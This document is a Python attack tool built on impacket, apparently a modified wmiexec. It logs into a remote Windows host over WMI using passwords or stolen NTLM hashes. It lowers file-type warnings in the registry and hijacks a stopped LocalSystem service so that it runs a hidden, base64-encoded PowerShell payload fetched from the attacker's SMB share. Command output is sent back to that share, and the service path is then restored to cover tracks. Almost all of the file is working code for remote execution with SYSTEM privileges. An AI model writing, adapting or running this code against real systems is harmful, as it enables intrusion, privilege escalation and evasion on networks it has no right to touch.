import sys
import os
import argparse
import time
from base64 import b64encode

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5.keytab import Keytab
from impacket import smbserver, version
import threading
import logging
CODEC = sys.stdout.encoding


class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, remoteHost="",smbIP=""):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__remoteHost = remoteHost
        self.shell = None
        self.reg = None
        self.__smbIP = smbIP
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):

        global smb_server

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost, remoteHost=self.__remoteHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServicesDefault = iWbemLevel1Login.NTLMLogin('//./root/default', NULL, NULL)
            iWbemServicesCimv2  = iWbemLevel1Login.NTLMLogin('//./root/cimv2',  NULL, NULL)
            iWbemLevel1Login.RemRelease()

            StdRegProv, _ = iWbemServicesDefault.GetObject('StdRegProv')
            StdRegProv.createMethods('StdRegProv', StdRegProv.getMethods())

            self.reg = RemoteRegCheck(StdRegProv)
            print("[*] Check if LowRiskFileTypes is set to .cmd")
            #i need to clean this
            if not self.reg.CheckPreValues(r"Software\Microsoft\Windows\CurrentVersion\Policies\Associations","LowRiskFileTypes",".cmd"):
                self.reg.CreateKeys(r"Software\Microsoft\Windows\CurrentVersion\Policies\Associations","LowRiskFileTypes",".cmd")
            print("[+] Good, everything is set correctly")

            print("[*] Querying a stopped service.")
            results = iWbemServicesCimv2.ExecQuery(
                'SELECT * FROM Win32_Service WHERE State="Stopped" AND StartName="LocalSystem"'
            )

            service = results.Next(0xFFFFFFFF, 1)[0] 
            service.createMethods(service.getClassName(), service.getMethods())
            print("[+] Suitable service found")
            print("[+] Service Name : " + service.Name)
            print("[+] State : " + service.State)
            print("[+] PathName : " + service.PathName)
            print("[+] StartName : " + service.StartName)

            self.serv = RemoteService(service)

            print("[*] Changing service PathName..")
            self.serv.ChangePathName(rf"C:\Windows\System32\scriptrunner.exe -appvscript \\{self.__smbIP}\share\shell.cmd")
            print("[+] Service PathName changed successfully!")
            print("[*] Preparing payload & Triggering Service")
            PreparePayload(self.__command,self.__smbIP)
            self.serv.StartService()
            print("[+] Preparing payload & Triggering Service Done!")
            print("")
            while not os.path.exists("share/output/done.txt") or os.path.getsize("share/output/done.txt") == 0:
                continue
            print("[+] Result recived!")

            print(read_file("share/output/out.txt"))

            # Revert Path
            print("[*] Revert path to orignal path")
            self.serv.ChangePathName(service.PathName)

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()

            smb_server.stop()
            sys.stdout.flush()
            sys.exit(1)

        dcom.disconnect()
        smb_server.stop()


class RemoteRegCheck():
    def __init__(self, StdRegProv):
        self.__StdRegProv = StdRegProv
        self.__hDefKey = 2147483650

    def CheckPreValues(self, sSubKeyName, sValueName, needVal):
        Out = self.__StdRegProv.GetStringValue(self.__hDefKey, sSubKeyName, sValueName)
        value = Out.sValue
        if value is None:
            return False
        if needVal in value:
            return True
        else:
            return False

    def CreateKeys(self,sSubKeyName,sValueName,sValue):
        Out = self.__StdRegProv.CreateKey(self.__hDefKey, sSubKeyName)
        if Out.ReturnValue == 0:
            Out = self.__StdRegProv.SetStringValue(self.__hDefKey, sSubKeyName,sValueName,sValue)
            return Out.ReturnValue

class RemoteService():
    def __init__(self, service):
        self.__service = service
        self.__originalPath        = service.PathName
        self.__displayName         = service.DisplayName
        self.__serviceType         = service.ServiceType
        self.__errorControl        = service.ErrorControl
        self.__startMode           = service.StartMode
        self.__desktopInteract     = service.DesktopInteract
        self.__startName           = service.StartName

    def ChangePathName(self, path):
        self.__service.Change(
            self.__displayName,  
            path,
            16,
            1,
            self.__startMode,
            0,
            self.__startName,
            '',
            '',
            [],
            []
        )
    def StartService(self):
        self.__service.StartService()

smb_server = None
def StartSmbServer():
    global smb_server

    smb_server = smbserver.SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
    smb_server.addShare("SHARE", "share/" , "", readOnly="no")
    smb_server.setSMB2Support(True)
    smb_server.setDropSSP(False)
    smb_server.setSMBChallenge('')
    
    smb_server.start()


def read_file(path):
    with open(path, "r",encoding="utf-16-le") as f:
        data = f.read()
    os.remove(path)
    os.remove("share/output/done.txt")
    return data

def PreparePayload(command,smbIP):
    command = rf"IEX('{command}') > \\{smbIP}\share\output\out.txt;echo done > \\{smbIP}\share\output\done.txt"
    base64Command = b64encode(command.encode('utf-16le')).decode()

    Powershell = f"powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc {base64Command}"

    cmdFile = f"@echo off\n{Powershell}"
    with open("share/shell.cmd", "w") as f:
        f.write(cmdFile)
# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell using Windows "
                                                                "Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')

    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('-smbIP', action='store',default='',help='ip to retrive commands from and send command to by using SMB')

    parser.add_argument('command', nargs='*', default='', help='command to execute at the target. If empty it will '
                                                                'launch a semi-interactive shell')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                      "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.debug)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'
    if options.command == '':
        print("pls provide the target and command\n[domain/]username[:password]@]<targetName or address> '<command>")
        sys.exit(1)
    if options.smbIP == '':
        logging.error("add ip with -smbIP to retrive commands from and send command to by using SMB")

        sys.exit(1)

  
    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
            repr(domain), repr(username), repr(password)))

        if options.target_ip is None:
            options.target_ip = address

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True
        smb_thread = threading.Thread(target=StartSmbServer)
        smb_thread.daemon = True
        smb_thread.start()
        time.sleep(1)
        executer = WMIEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey
                           , options.k, options.dc_ip, options.target_ip,options.smbIP)
        executer.run(address)
    except KeyboardInterrupt as e:
        logging.error(str(e))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)

    sys.exit(0)
